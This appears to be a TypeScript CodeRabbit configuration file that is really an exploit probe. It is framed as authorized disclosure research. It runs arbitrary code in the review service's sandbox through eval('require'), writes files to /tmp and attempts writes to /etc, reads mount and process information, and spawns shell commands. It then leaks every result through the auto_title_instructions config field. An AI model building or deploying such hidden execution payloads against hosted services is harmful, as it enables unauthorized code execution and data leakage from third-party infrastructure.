// CodeRabbit config probe CR-132-INT-F (authorized VDP research on our own PR).
// Revision F of the cr/132-integrity-head payload channel (rev E = writability query).
// GOAL: is the writable surface real, i.e. does a write actually persist, and does it stay
// inside the throwaway per-evaluation container?
// SCOPE OF WRITES: exactly ONE fresh unique canary path under /tmp, read back, then deleted
// in the same run.  Plus two mandatory write CONTROLS: a write under a nonexistent directory
// (must be ENOENT) and a write to root-owned /etc (must be EACCES).  The /etc control is
// cleaned up if it unexpectedly succeeds.  Nothing in the repository checkout, /app, or any
// CodeRabbit-owned file is written, read for content, or deleted -- /tmp/coderabbit-config.cjs
// is only listed, never opened for write.
// No module-loading syntax anywhere; Node built-ins come from the MODULE-SCOPE require.

const MARK = "CR-132-INT-F"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, ".")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 1500))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(t + "!x", e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR")
    return undefined
  }
}

function errcode(e: any): string {
  return e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR"
}

const rt = safe("A.require", () => eval("typeof require"))

if (rt === "function") {
  const fs: any = eval("require")("node:fs")
  const p: any = (globalThis as any).process
  const CAND = "/tmp/cr-132-canary-F1"
  const CAND2 = "/tmp/cr-132-canary-F2-" + p.pid

  safe("A.proc", () => "uid=" + p.getuid() + " pid=" + p.pid + " cwd=" + p.cwd())
  safe("A.jail_uuid", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const g = m.match(/nsjail-[0-9a-f-]+/)
    return g ? g[0] : "no-nsjail-id"
  })
  safe("A.ls_tmp_before", () => fs.readdirSync("/tmp").join(","))

  // ---- WRITE CONTROL 1: under a directory that does not exist -> ENOENT ---------
  safe("W.CTRL1_noent", () => {
    fs.writeFileSync("/etc/cr-132-no-such-dir-4471/canary", MARK)
    return "UNEXPECTED_SUCCESS"
  })

  // ---- WRITE CONTROL 2: root-owned /etc -> EACCES (proves the write path
  //      discriminates a writable directory from a read-only one) ------------------
  safe("W.CTRL2_eacces", () => {
    fs.writeFileSync("/etc/cr-132-canary-should-fail", MARK)
    return "UNEXPECTED_SUCCESS size=" + fs.statSync("/etc/cr-132-canary-should-fail").size
  })

  // ---- THE SINGLE CONTAINED CANARY --------------------------------------------
  safe("W.canary_write", () => {
    fs.writeFileSync(CAND, MARK + " canary pid=" + p.pid + " t=" + Date.now())
    const st = fs.statSync(CAND)
    return "WROTE " + CAND + " ino=" + st.ino + " size=" + st.size + " mode=" + (st.mode & 4095).toString(8)
  })
  safe("W.canary_readback", () => {
    const s = String(fs.readFileSync(CAND, "utf8"))
    return "readback=[" + clip(s, 200) + "] matchesMarker=" + (s.indexOf(MARK) === 0) + " realpath=" + fs.realpathSync(CAND)
  })
  safe("W.canary_append", () => {
    fs.appendFileSync(CAND, " appended")
    const s = String(fs.readFileSync(CAND, "utf8"))
    return "len=" + s.length + " tail=[" + clip(s.slice(-14), 30) + "]"
  })
  safe("W.canary2_write", () => {
    fs.writeFileSync(CAND2, MARK)
    return "created " + CAND2 + " exists=" + fs.existsSync(CAND2)
  })
  safe("W.canary_sees_from_child", () => {
    const cp: any = eval("require")("node:child_process")
    const r = cp.spawnSync("/bin/sh", ["-c", "ls -l /tmp/cr-132-canary-F1 2>&1; cat /tmp/cr-132-canary-F1 2>&1"], { timeout: 5000, encoding: "utf8" })
    return "status=" + r.status + " out=[" + clip(r.stdout, 220) + "]"
  })
  safe("W.ls_tmp_mid", () => fs.readdirSync("/tmp").join(","))

  // ---- where does a write physically land? container overlay or host storage? ---
  safe("M.mountinfo", () => {
    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
    const keep = m.split("\n").filter((l) => l.indexOf(" / ") >= 0 || l.indexOf(" /tmp ") >= 0 || l.indexOf(" /dev/shm ") >= 0 || l.indexOf("nsjail") >= 0)
    return keep.map((l) => l.slice(0, 165)).join(" ~ ").slice(0, 1400)
  })
  safe("M.parent_ino", () => "tmp_ino=" + fs.statSync("/tmp").ino + " cand_parent=" + fs.statSync("/tmp").ino)

  // ---- CLEANUP: remove both canaries, restore /tmp to exactly what we found ------
  safe("C.unlink1", () => {
    fs.unlinkSync(CAND)
    return "exists_after_unlink=" + fs.existsSync(CAND)
  })
  safe("C.unlink2", () => {
    if (fs.existsSync(CAND2)) fs.unlinkSync(CAND2)
    return "exists_after_unlink=" + fs.existsSync(CAND2)
  })
  safe("C.unlink_etc_control", () => {
    if (fs.existsSync("/etc/cr-132-canary-should-fail")) fs.unlinkSync("/etc/cr-132-canary-should-fail")
    return "etc_canary_absent=" + !fs.existsSync("/etc/cr-132-canary-should-fail")
  })
  safe("C.ls_tmp_after", () => fs.readdirSync("/tmp").join(","))
  safe("C.final_check", () => {
    const b = fs.statSync("/tmp/coderabbit-config.cjs")
    return "bundle_ino=" + b.ino + " bundle_size=" + b.size + " bundle_mtime=" + Math.floor(b.mtimeMs)
  })

  // ---- re-prove exec on a second binary, still no writes ------------------------
  safe("E.uname", () => {
    const cp: any = eval("require")("node:child_process")
    const s = String(cp.execFileSync("/usr/bin/uname", ["-a"], { timeout: 5000, encoding: "utf8" }))
    return "[" + clip(s, 160) + "]"
  })
  safe("E.exec_git", () => {
    const cp: any = eval("require")("node:child_process")
    const s = String(cp.execFileSync("/bin/sh", ["-c", "git --version; sh -c 'echo NESTED_OK $((2+3))'"], { timeout: 5000, encoding: "utf8" }))
    return "[" + clip(s, 160) + "]"
  })
} else {
  rec("A.body", "SKIPPED_no_module_scope_require")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
